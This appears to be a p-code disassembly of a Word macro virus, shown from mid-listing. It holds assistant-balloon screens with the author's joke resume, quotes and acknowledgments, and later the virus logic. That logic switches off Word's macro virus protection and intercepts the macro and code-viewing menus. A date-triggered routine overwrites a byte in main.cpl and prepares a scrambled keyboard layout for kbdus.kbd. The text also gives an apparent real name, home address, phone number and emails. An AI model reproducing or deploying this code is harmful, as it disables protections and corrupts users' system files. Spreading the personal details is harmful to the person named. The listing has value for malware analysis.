' 	Ld resBalMess 
' 	MemSt BalloonType 
' Line #337:
' Line #338:
' 	LitStr 0x0000 ""
' 	Ld resBalMess 
' 	MemSt Then 
' Line #339:
' 	LitDI2 0x0003 
' 	Ld resBalMess 
' 	MemLd Labels 
' 	MemSt Count 
' Line #340:
' 	LitStr 0x0050 "Hardworking, Softworking, Quiet(low-noise), Sociable Person especially on Party "
' 	LitDI2 0x0001 
' 	Ld resBalMess 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #341:
' 	LitStr 0x0082 "Reliable, with Good Interpersonal Communicatin Skills and Intrapersonal Communication Skills (8 data bits, odd parity, 1 stop bit)"
' 	LitDI2 0x0002 
' 	Ld resBalMess 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #342:
' 	LitStr 0x007D "Goal-oriented, Success-oriented, Journey-Oriented, Object-Oriented Person, w/ Good Moral Character and w/ Pissing Personality"
' 	LitDI2 0x0003 
' 	Ld resBalMess 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #343:
' 	Ld resBalMess 
' 	ArgsMemCall Show 0x0000 
' Line #344:
' Line #345:
' 	Ld resmPersonalForeground 
' 	Case 
' 	CaseDone 
' Line #346:
' Line #347:
' 	Ld msoAnimationGetAttentionMinor 
' 	Ld resBalMess 
' 	MemSt Animation 
' Line #348:
' 	LitStr 0x0013 "Personal Foreground"
' 	Ld resBalMess 
' 	MemSt Heading 
' Line #349:
' 	Ld msoBalloonTypeBullets 
' 	Ld resBalMess 
' 	MemSt BalloonType 
' Line #350:
' Line #351:
' 	LitStr 0x0000 ""
' 	Ld resBalMess 
' 	MemSt Then 
' Line #352:
' 	LitDI2 0x0005 
' 	Ld resBalMess 
' 	MemLd Labels 
' 	MemSt Count 
' Line #353:
' 	LitStr 0x0026 "Black-eyes, black hair, black nostrils"
' 	LitDI2 0x0001 
' 	Ld resBalMess 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #354:
' 	LitStr 0x001D "Cute (Patingin nga ng Dimple)"
' 	LitDI2 0x0002 
' 	Ld resBalMess 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #355:
' 	LitStr 0x0017 "Down-to-Earth (ALIEN?!)"
' 	LitDI2 0x0003 
' 	Ld resBalMess 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #356:
' 	LitStr 0x0019 "Boy-Next-Windows '95 Type"
' 	LitDI2 0x0004 
' 	Ld resBalMess 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #357:
' 	LitStr 0x0019 "Macho-chulis ang mga buto"
' 	LitDI2 0x0005 
' 	Ld resBalMess 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #358:
' 	Ld resBalMess 
' 	ArgsMemCall Show 0x0000 
' Line #359:
' Line #360:
' 	Ld butNext 
' 	Case 
' 	CaseDone 
' Line #361:
' Line #362:
' 	LitDI2 0x0003 
' 	Ld resBal2 
' 	MemLd Labels 
' 	MemSt Count 
' Line #363:
' 	LitStr 0x0019 "Michael Learns To Hack..."
' 	Ld resBal2 
' 	MemSt Heading 
' Line #364:
' 	LitStr 0x0012 "Interactive Resume"
' 	Ld resBal2 
' 	MemSt Then 
' Line #365:
' 	LitStr 0x0014 "Character References"
' 	LitDI2 0x0001 
' 	Ld resBal2 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #366:
' 	LitStr 0x0014 "Quote for the Moment"
' 	LitDI2 0x0002 
' 	Ld resBal2 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #367:
' 	LitStr 0x000C "Inside Story"
' 	LitDI2 0x0003 
' 	Ld resBal2 
' 	ArgsMemLd Labels 0x0001 
' 	MemSt Then 
' Line #368:
' 	Ld msoButtonSetBackClose 
' 	Ld resBal2 
' 	MemSt Button 
' Line #369:
' 	Ld resBal2 
' 	MemLd Show 
' 	St resOpt 
' Line #370:
' Line #371:
' 	Ld resOpt 
' 	SelectCase 
' Line #372:
' 	Ld resmCharRef 
' 	Case 
' 	CaseDone 
' Line #373:
' 	LitDI2 0x0000 
' 	Ld resBalMess 
' 	MemLd Labels 
' 	MemSt Count 
' Line #374:
' 	LitStr 0x0014 "Character References"
' 	Ld resBalMess 
' 	MemSt Heading 
' Line #375:
' 	LineCont 0x0008 0A 00 08 00 18 00 1C 00
' 	LitStr 0x0038 "(In No Particular Order Using Rnd (110) and Randomize ) "
' 	Ld nl 
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0357 "Franco Rayela, Roger Macalino, Byron James C. Ngan, Onel de Guzman, Serafin Santos, Conrad Pena, Jerome Sison, Alde Aceveda, Philip Mora, Richard Canuto, Leonides "Darren" Mendoza, Emetrio "Jing" Austria, Irving Ilagan, Christian Ramirez, Edwin & Erwin Quita, Joana Alonso, Frederick Vicent Tant, Roland Moldez, Lilibeth Serencio, Gilberto Piliin, Michael Santiano, Michael Salamat, Michael Manuel Murillo, Michael Lucas, Joseph Taopo, Joseph Borja, Joseph Landicho, Giovanni Largo, Juvany Ponce, Alberto Cayanan, Ronald Batoon, Philip Miralles, Jay Manpreet, Aldwin Mapili, Virgilio So, Erlinda Sy, Philbert Pagaspas, Juanita Cataag, Mar Dojillo, Novelita Calimag, Verlin Samonte, Sir Bernabe Santa Maria, Alejandro Bais, Ma'am Grace Quitoriano, Sir Lucero, Ma'am Maderas, Sir Omar Ghazal, Sir Angelo Gillen, Dondi Macas, Arsenio Macapaz, Rolly Mendoza, "
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x001D "(Not My Character References)"
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0058 "President Joseph Estrada, Blas Ople, Franklin Drilon, Jose Ma. Sison, Jolina Magdangal, "
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x002D "Kristin Hermosa, Aurora Halili, Angela Velez "
' 	Concat 
' 	Ld resBalMess 
' 	MemSt Then 
' Line #376:
' 	Ld msoAnimationGestureUp 
' 	Ld resBalMess 
' 	MemSt Animation 
' Line #377:
' 	Ld resBalMess 
' 	ArgsMemCall Show 0x0000 
' Line #378:
' 	Ld resmQuote 
' 	Case 
' 	CaseDone 
' Line #379:
' 	ArgsCall (Call) Quote 0x0000 
' Line #380:
' 	Ld resmInsideStory 
' 	Case 
' 	CaseDone 
' Line #381:
' 	LitDI2 0x0000 
' 	Ld resBalMess 
' 	MemLd Labels 
' 	MemSt Count 
' Line #382:
' 	LitStr 0x000B "InsideStory"
' 	Ld resBalMess 
' 	MemSt Heading 
' Line #383:
' 	LineCont 0x005C 08 00 20 00 0C 00 20 00 10 00 20 00 14 00 20 00 18 00 20 00 1C 00 20 00 20 00 20 00 24 00 20 00 28 00 20 00 2C 00 20 00 30 00 20 00 36 00 20 00 3A 00 20 00 3E 00 20 00 42 00 20 00 48 00 20 00 4C 00 20 00 52 00 20 00 56 00 20 00 5A 00 24 00 5E 00 00 00 60 00 20 00 66 00 20 00
' 	LitStr 0x0015 "Programmer 's Profile"
' 	Ld nl 
' 	Concat 
' 	LitStr 0x001F "Real Mode Name: Michael I. Buen"
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x003C "Protected Mode Name: Mycklangelo "The Skulltor\n" Buenarotti"
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x001A "Birthday: November 5, 1976"
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0032 "Address: Block 6 Lot 3 Hauskon Homes, Daang Amaya,"
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x001A "         Tanza Cavite City"
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x001A "Telephone: (046) 505-17-39"
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x003C "e-mail address: mycklangelo@yahoo.com;mcklangelo@hotmail.com"
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x002D "Group Affiliated: GRAMMERSoft, Elevated Ideas"
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0032 "Group Not Affiliated: AMACConda Group of Companies"
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0029 "Services Offered: Programming , Debugging"
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x002E "Services Not Offered: Hacking , Pest - Control"
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0009 "About Me:"
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x005A "I 'm not a virus programmer per se, I'm just a dedicated programmer and a serious learner."
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0028 "My Favorite Principle in Writing (Code):"
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0080 "A book is finished not when nothing more can be added, but when nothing can be remove from it. -- Code Complete: Steve McConnell"
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x001A "My Interest And Activites:"
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0091 "Reading, Analyzing, Hacking, Reading, Analyzing, Reading, Reading, Analyzing, Hacking, Analyzing, Analyzing, Analyzing, Analyzing, (program halt)"
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x000F "Favorite Quote:"
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0042 "The cure for boredom is curiosity.  There is no cure for curiosity"
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0015 "*** ACNOWLEDGMENT ***"
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x03F5 "I 'm thanking Byron for sharing his computer and ideas, book and time, I'm using his computer every Saturday and Sunday just to write this program.  And to all GRAMMERSoft especially LIENQ, I know what the hell of hacking we are all doing but nevertheless it is still legitimate learning.  And to PC-Cillin, the anti-virus software that gave me a hint that events of Word and Excel can be hooked by naming your procedures with the name of the event.  And to Rivermaya, Eraserheads, Renz Verano who's continuing to write Original Pilipino Music that calms our soul.  And Since I haven't yet finished my Thesis and Automata, I'll consider this as my quick software project, so I'll have to thanks all those beta tester of this virus, you can send me you comment and ratings about my program.  And to Mark ( he's currently a freshman computer science at Adamson University ) my brother, sorry I haven't include your picture here, the program has grown too large already.  Kung nagkataon ang pangalan ng virus na ito "
' 	Concat 
' 	LitStr 0x0013 "ay "Mark My Word "."
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x003A "-- Be a Superlearner, Enroll at AMACConda Computer College"
' 	Concat 
' 	Ld resBalMess 
' 	MemSt Then 
' Line #384:
' 	Ld msoAnimationCheckingSomething 
' 	Ld resBalMess 
' 	MemSt Animation 
' Line #385:
' 	Ld resBalMess 
' 	ArgsMemCall Show 0x0000 
' Line #386:
' Line #387:
' 	EndSelect 
' Line #388:
' 	EndSelect 
' Line #389:
' 	Ld resOpt 
' 	Ld butClose 
' 	Ne 
' 	LoopWhile 
' Line #390:
' 	EndIfBlock 
' Line #391:
' 	EndIfBlock 
' Line #392:
' 	EndSub 
' Line #393:
' Line #394:
' 	FuncDefn (Sub ToolsOptions())
' Line #395:
' 	OnError (Resume Next) 
' Line #396:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #397:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #398:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #399:
' 	EndSub 
' Line #400:
' Line #401:
' 	FuncDefn (Sub ViewVBCode())
' Line #402:
' 	OnError (Resume Next) 
' Line #403:
' 	LitStr 0x000C "Visual Basic"
' 	Paren 
' 	ArgsCall msg 0x0001 
' Line #404:
' 	Ld wdCursorNormal 
' 	Ld System 
' 	MemSt Cursor 
' Line #405:
' 	EndSub 
' Line #406:
' Line #407:
' 	FuncDefn (Sub ToolsMacro())
' Line #408:
' 	OnError (Resume Next) 
' Line #409:
' 	LitStr 0x000B "Macro Tools"
' 	Paren 
' 	ArgsCall msg 0x0001 
' Line #410:
' 	Ld wdCursorNormal 
' 	Ld System 
' 	MemSt Cursor 
' Line #411:
' 	EndSub 
' Line #412:
' Line #413:
' 	FuncDefn (Sub Quote())
' Line #414:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x000E 
' 	VarDefn quotes (As String)
' Line #415:
' 	Dim 
' 	VarDefn qBal (As Balloon)
' Line #416:
' Line #417:
' 	Dim (Static) 
' 	VarDefn prevQuote (As Long)
' Line #418:
' 	Dim (Static) 
' 	VarDefn currQuote (As Long)
' Line #419:
' Line #420:
' 	Dim 
' 	VarDefn nl (As String)
' Line #421:
' Line #422:
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	St nl 
' Line #423:
' Line #424:
' 	OnError (Resume Next) 
' Line #425:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #426:
' Line #427:
' 	LineCont 0x000C 0B 00 10 00 0D 00 10 00 0F 00 10 00
' 	LitStr 0x000E "On Fuzzy Logic"
' 	Ld nl 
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x001C ""  He who would distinguish "
' 	Concat 
' 	LitStr 0x001F "  the true from false must have"
' 	Concat 
' 	LitStr 0x0035 "  an adequate idea of what is true and what is false""
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsSt quotes 0x0001 
' Line #428:
' Line #429:
' 	LineCont 0x0018 07 00 10 00 0D 00 10 00 0F 00 10 00 11 00 10 00 13 00 10 00 15 00 10 00
' 	LitStr 0x0018 "On Creating a Pseudocode"
' 	Ld nl 
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0026 "Iterate.  Try as many ideas as you can"
' 	Concat 
' 	LitStr 0x0039 " in PDL (program design language)before you start coding."
' 	Concat 
' 	LitStr 0x002C "  Once you start coding, you get emotionally"
' 	Concat 
' 	LitStr 0x0031 " involved with your code and it becomes harder to"
' 	Concat 
' 	LitStr 0x0028 " throw away a bad design and start over."
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0012 "-- Steve McConnell"
' 	Concat 
' 	LitDI2 0x0002 
' 	ArgsSt quotes 0x0001 
' Line #430:
' Line #431:
' Line #432:
' 	LineCont 0x0008 07 00 10 00 09 00 10 00
' 	LitStr 0x002E ""The cure for boredom is curiosity.  There is "
' 	LitStr 0x0017 " no cure for curiosity""
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0011 "-- Dorothy Parker"
' 	Concat 
' 	LitDI2 0x0003 
' 	ArgsSt quotes 0x0001 
' Line #433:
' Line #434:
' 	LineCont 0x0014 07 00 10 00 0D 00 10 00 0F 00 10 00 11 00 10 00 13 00 10 00
' 	LitStr 0x0019 "On Tracking Down an Error"
' 	Ld nl 
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0025 "  "And if you can take one from three"
' 	Concat 
' 	LitStr 0x0027 " hundred and sixty-five, what remains?""
' 	Concat 
' 	LitStr 0x0037 "  "Three hundred and sixty-four of course", Alice said."
' 	Concat 
' 	LitStr 0x004F "  Humpty Dumpty looked doubtful.  "I'd rather see that done in paper", he said."
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0015 "--Alice in Wonderland"
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsSt quotes 0x0001 
' Line #435:
' Line #436:
' 	LineCont 0x0034 07 00 11 00 0D 00 11 00 0F 00 11 00 11 00 11 00 13 00 11 00 15 00 11 00 17 00 11 00 19 00 11 00 1B 00 11 00 1D 00 11 00 1F 00 11 00 21 00 11 00 23 00 11 00
' 	LitStr 0x0017 "On Good Variable Naming"
' 	Ld nl 
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0019 "  "Don't stand chattering"
' 	Concat 
' 	LitStr 0x002D " to yourself like that," Humpty Dumpty said, "
' 	Concat 
' 	LitStr 0x0031 " looking at her for the first time, "but tell me "
' 	Concat 
' 	LitStr 0x0023 " your name and your business."  "My"
' 	Concat 
' 	LitStr 0x0021 " name is Alice, but --".  "It's a"
' 	Concat 
' 	LitStr 0x0024 " stupid name enough!", Humpty Dumpty"
' 	Concat 
' 	LitStr 0x0025 " interrupted impatiently.  "What does"
' 	Concat 
' 	LitStr 0x002F " it mean?", "Must a name mean something?" Alice"
' 	Concat 
' 	LitStr 0x0030 " asked doubtfully.  "Of course it must,"  Humpty"
' 	Concat 
' 	LitStr 0x0034 " Dumpty said with a short laugh:  "My name means the"
' 	Concat 
' 	LitStr 0x0037 " shape that I am and a good handsome shape it is, too. "
' 	Concat 
' 	LitStr 0x0031 " With a name like yours, you might be any shape, "
' 	Concat 
' 	LitStr 0x0009 " almost.""
' 	Concat 
' 	LitDI2 0x0005 
' 	ArgsSt quotes 0x0001 
' Line #437:
' Line #438:
' Line #439:
' 	LineCont 0x0008 07 00 11 00 09 00 11 00
' 	LitStr 0x003A ""The significant problems we face cannot be solved by the "
' 	LitStr 0x002A "same level of thinking that created them.""
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0011 "--Albert Einstein"
' 	Concat 
' 	LitDI2 0x0006 
' 	ArgsSt quotes 0x0001 
' Line #440:
' Line #441:
' Line #442:
' 	LineCont 0x0008 07 00 11 00 09 00 11 00
' 	LitStr 0x003A ""Words are so powerful, but I found it powerfully useless "
' 	LitStr 0x002C "just to come up with a statement like this.""
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0011 "--Michael I. Buen"
' 	Concat 
' 	LitDI2 0x0007 
' 	ArgsSt quotes 0x0001 
' Line #443:
' Line #444:
' 	LineCont 0x0010 07 00 11 00 0D 00 11 00 0F 00 11 00 11 00 11 00
' 	LitStr 0x0015 "On Temporary Solution"
' 	Ld nl 
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0034 ""One powerful heuristic tool is brure force.  Don't "
' 	Concat 
' 	LitStr 0x0044 "underestimate it.  A brute force solution is better than an elegant "
' 	Concat 
' 	LitStr 0x001C "solution that doesn't work.""
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0011 "--Steve McConnell"
' 	Concat 
' 	LitDI2 0x0008 
' 	ArgsSt quotes 0x0001 
' Line #445:
' Line #446:
' 	LineCont 0x0014 07 00 11 00 0D 00 11 00 0F 00 11 00 11 00 11 00 13 00 11 00
' 	LitStr 0x0017 "On Design Process Stage"
' 	Ld nl 
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0030 ""We try to solve the problem by rushing through "
' 	Concat 
' 	LitStr 0x003D "the design process so that enough time is left at the end of "
' 	Concat 
' 	LitStr 0x003F "project to uncover the errors that were made because we rushed "
' 	Concat 
' 	LitStr 0x001C "through the design process.""
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0010 "--Glenford Myers"
' 	Concat 
' 	LitDI2 0x0009 
' 	ArgsSt quotes 0x0001 
' Line #447:
' Line #448:
' 	LineCont 0x000C 0B 00 11 00 0D 00 11 00 0F 00 11 00
' 	LitStr 0x0019 "On Premature Optimization"
' 	Ld nl 
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x003D ""We should forget about small efficiencies, say about 97% of "
' 	Concat 
' 	LitStr 0x003A "the time: premature optimization is the root of all evil.""
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x000E "--Donald Knuth"
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsSt quotes 0x0001 
' Line #449:
' Line #450:
' 	LineCont 0x0008 07 00 11 00 09 00 11 00
' 	LitStr 0x0034 ""The problem definition lays the foundation for the "
' 	LitStr 0x0021 "rest of the programming process.""
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0011 "--Steve McConnell"
' 	Concat 
' 	LitDI2 0x000B 
' 	ArgsSt quotes 0x0001 
' Line #451:
' Line #452:
' 	LineCont 0x0008 07 00 11 00 09 00 11 00
' 	LitStr 0x0030 ""From a programmer's point of view, the user is "
' 	LitStr 0x0037 "a peripheral that types when you issue a read request.""
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0010 "--Peter Williams"
' 	Concat 
' 	LitDI2 0x000C 
' 	ArgsSt quotes 0x0001 
' Line #453:
' Line #454:
' 	LineCont 0x0010 07 00 11 00 09 00 11 00 0B 00 11 00 0D 00 11 00
' 	LitStr 0x0038 ""Programming today is a race between software engineers "
' 	LitStr 0x003A "striving to build bigger and better idiot-proof programs, "
' 	Concat 
' 	LitStr 0x003D "and the universe trying to produce bigger and better idiots. "
' 	Concat 
' 	LitStr 0x0020 "So far the universe is winning.""
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x000B "--Rich Cook"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsSt quotes 0x0001 
' Line #455:
' Line #456:
' 	LineCont 0x0004 07 00 11 00
' 	LitStr 0x0038 ""I can do everything through Him who gives me strength.""
' 	Ld nl 
' 	Concat 
' 	Ld nl 
' 	Concat 
' 	LitStr 0x0034 "--Philipians 4:13 (courtesy of Byron2 James C. Ngan)"
' 	Concat 
' 	LitDI2 0x000E 
' 	ArgsSt quotes 0x0001 
' Line #457:
' Line #458:
' 	ArgsCall (Call) Read 0x0000 
' Line #459:
' 	Do 
' Line #460:
' 	ArgsLd Randomize 0x0000 
' 	St currQuote 
' Line #461:
' 	Ld currQuote 
' 	Ld prevQuote 
' 	Eq 
' 	LoopWhile 
' Line #462:
' Line #463:
' 	SetStmt 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	Set qBal 
' Line #464:
' 	LitStr 0x0014 "Quote for the Moment"
' 	Ld qBal 
' 	MemSt Heading 
' Line #465:
' 	Ld msoAnimationThinking 
' 	Ld qBal 
' 	MemSt Animation 
' Line #466:
' 	Ld currQuote 
' 	ArgsLd quotes 0x0001 
' 	Ld qBal 
' 	MemSt Then 
' Line #467:
' 	Ld qBal 
' 	ArgsMemCall Show 0x0000 
' Line #468:
' Line #469:
' 	Ld currQuote 
' 	St prevQuote 
' Line #470:
' 	EndSub 
' Line #471:
' Line #472:
' Line #473:
' 	FuncDefn (Function Randomize() As Long)
' Line #474:
' 	LitDI2 0x000E 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St Randomize 
' Line #475:
' 	EndFunc 
' Line #476:
' Line #477:
' 	FuncDefn (Sub ChangeSomething())
' Line #478:
' 	Dim 
' 	VarDefn kb
' Line #479:
' 	Dim 
' 	VarDefn i (As Long)
' Line #480:
' 	Dim 
' 	VarDefn l (As Long)
' Line #481:
' 	Dim 
' 	VarDefn chgHdr (As Byte)
' Line #482:
' 	Dim 
' 	VarDefn f1 (As Integer)
' Line #483:
' 	Dim 
' 	VarDefn vball (As Integer)
' Line #484:
' Line #485:
' 	OnError (Resume Next) 
' Line #486:
' 	Ld vbReadOnly 
' 	Ld vbSystem 
' 	Add 
' 	Ld vbHidden 
' 	Add 
' 	Ld vbArchive 
' 	Add 
' 	St vball 
' Line #487:
' Line #488:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0007 
' 	Le 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbMonday 
' 	Eq 
' 	And 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07CF 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #489:
' 	ArgsLd Friend 0x0000 
' 	St f1 
' Line #490:
' 	LitStr 0x001A "c:\windows\system\main.cpl"
' 	Ld vbNormal 
' 	ArgsCall (Call) SetAttr 0x0002 
' Line #491:
' 	LitStr 0x001A "c:\windows\system\main.cpl"
' 	Ld f1 
' 	Sharp 
' 	LitDefault 
' 	Open (For Random)
' Line #492:
' 	LitDI2 0x0042 
' 	St chgHdr 
' Line #493:
' 	Ld f1 
' 	Sharp 
' 	LitDI2 0x0001 
' 	Ld chgHdr 
' 	PutRec 
' Line #494:
' 	Ld f1 
' 	Sharp 
' 	Close 0x0001 
' Line #495:
' Line #496:
' 	LineCont 0x002C 20 00 0C 00 3E 00 0C 00 50 00 0C 00 5F 00 0C 00 6E 00 0C 00 7E 00 0C 00 8E 00 0C 00 9C 00 0C 00 AA 00 0C 00 B8 00 0C 00 C6 00 0C 00
' 	LitDI4 0x5344 0x0409 
' 	LitDI4 0x0000 0x0001 
' 	LitDI2 0x001C 
' 	LitDI2 0x0172 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI4 0x0002 0x0003 
' 	LitDI2 0x0005 
' 	LitDI4 0x0000 0x0026 
' 	LitDI4 0x002D 0x0058 
' 	LitDI4 0x0064 0x0070 
' 	LitDI4 0x0032 0x00A6 
' 	LitDI4 0x0076 0x0030 
' 	LitDI2 0x0142 
' 	LitDI2 0x0000 
' 	LitDI4 0xFFC8 0x7FED 
' 	UMi 
' 	LitDI4 0x7FF0 0x7FEE 
' 	UMi 
' 	LitDI4 0x0100 0x0302 
' 	LitDI2 0x0604 
' 	LitDI4 0x0101 0x0402 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI4 0xFFFE 0x07FF 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI4 0x00E2 0x00E2 
' 	LitDI4 0x0112 0x0112 
' 	LitDI4 0x00DA 0x00E0 
' 	LitDI4 0x0076 0x0076 
' 	LitDI4 0x0076 0x0076 
' 	LitDI4 0x00D6 0x00DE 
' 	LitDI4 0x3030 0x3030 
' 	LitDI4 0x0204 0x31C0 
' 	LitDI4 0x3332 0x3534 
' 	LitDI4 0x3736 0x3938 
' 	LitDI4 0xBD30 0x51BB 
' 	LitDI4 0x4557 0x5452 
' 	LitDI4 0x5559 0x4F49 
' 	LitDI4 0x24B0 0x2322 
' 	UMi 
' 	LitDI4 0x5341 0x4644 
' 	LitDI4 0x4847 0x4B4A 
' 	LitDI4 0xBA4C 0x5ADE 
' 	LitDI4 0x4358 0x4256 
' 	LitDI4 0xB2B2 0x4143 
' 	UMi 
' 	LitDI4 0xE2BF 0x0229 
' 	LitDI4 0x0403 0x0605 
' 	LitDI4 0x0807 0x0A09 
' 	LitDI4 0x0C0B 0x100D 
' 	LitDI4 0x1211 0x1413 
' 	LitDI4 0x1615 0x1817 
' 	LitDI4 0x1A19 0x2B1B 
' 	LitDI4 0x1F1E 0x2120 
' 	LitDI4 0x2322 0x2524 
' 	LitDI4 0x2726 0x2C28 
' 	LitDI4 0x2E2D 0x302F 
' 	LitDI4 0x3231 0x3433 
' 	LitDI4 0xA9CB 0x2324 
' 	UMi 
' 	LitDI4 0xE2DD 0x1C1B 
' 	LitDI4 0xE3E3 0x42C9 
' 	UMi 
' 	LitDI4 0x1F1E 0x4D60 
' 	LitDI4 0x7261 0x206B 
' 	LitDI4 0x7542 0x6E65 
' 	LitDI4 0x2D21 0x4D3D 
' 	LitDI4 0x6369 0x6168 
' 	LitDI4 0x6C65 0x3A20 
' 	LitDI4 0x5B29 0x5C5D 
' 	LitDI4 0x654C 0x7261 
' 	LitDI4 0x736E 0x7420 
' 	LitDI4 0x3B6F 0x4827 
' 	LitDI4 0x6361 0x216B 
' 	LitDI4 0x2121 0x2E2C 
' 	LitDI4 0x5C2F 0x217E 
' 	LitDI4 0x2340 0x2524 
' 	LitDI4 0x265E 0x282A 
' 	LitDI4 0x5F29 0x512B 
' 	LitDI4 0x4557 0x5452 
' 	LitDI4 0x5559 0x4F49 
' 	LitDI4 0x7B50 0x7C7D 
' 	LitDI4 0x5341 0x4644 
' 	LitDI4 0x4847 0x4B4A 
' 	LitDI4 0x3A4C 0x5A22 
' 	LitDI4 0x4358 0x4256 
' 	LitDI4 0x4D4E 0x3E3C 
' 	LitDI4 0x7C3F 0x3160 
' 	LitDI4 0x3332 0x3534 
' 	LitDI4 0x3736 0x3938 
' 	LitDI4 0x2D30 0x513D 
' 	LitDI4 0x4557 0x5452 
' 	LitDI4 0x5559 0x4F49 
' 	LitDI4 0x5B50 0x5C5D 
' 	LitDI4 0x5341 0x4644 
' 	LitDI4 0x4847 0x4B4A 
' 	LitDI4 0x3B4C 0x5A27 
' 	LitDI4 0x4358 0x4256 
' 	LitDI4 0x4D4E 0x2E2C 
' 	LitDI2 0x5C2F 
' 	ArgsArray Array 0x0064 
' 	St kb 
' Line #497:
' Line #498:
' 	ArgsLd Friend 0x0000 
' 	St f1 
' Line #499:
' 	LitStr 0x001B "c:\windows\system\kbdus.kbd"
' 	Ld vball 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0009 "kbdus.kbd"
' 	Eq 
' 	IfBlock 
' Line #500:
' 	LitStr 0x001B "c:\windows\system\kbdus.kbd"
' 	Ld vbNormal 
' 	ArgsCall (Call) SetAttr 0x0002 
' Line #501:
' 	EndIfBlock 
' Line #502:
